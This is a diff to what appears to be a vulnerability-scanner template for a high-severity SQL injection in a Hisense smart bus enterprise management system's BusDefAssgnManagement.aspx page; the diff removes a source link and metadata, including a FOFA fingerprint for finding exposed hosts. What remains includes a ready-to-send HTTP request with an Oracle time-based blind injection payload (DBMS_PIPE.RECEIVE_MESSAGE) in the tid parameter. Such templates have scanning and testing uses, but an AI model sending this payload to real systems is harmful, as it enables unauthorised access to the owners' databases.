@@ -3,12 +3,8 @@ info:
   name: 海信智能公交企业管理系统 BusDefAssgnManagement.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qkfde107v11aphum'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qkfde107v11aphum
-    fofa: body="var _FactoryData"
 http:
 - raw:
   - 'GET /YZSoft/Forms/XForm/BM/MaintainceManagement/BusDefAssgnManagement.aspx?tid=1+AND+3536=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(101)||CHR(88)||CHR(83),5)--+c HTTP/1.1
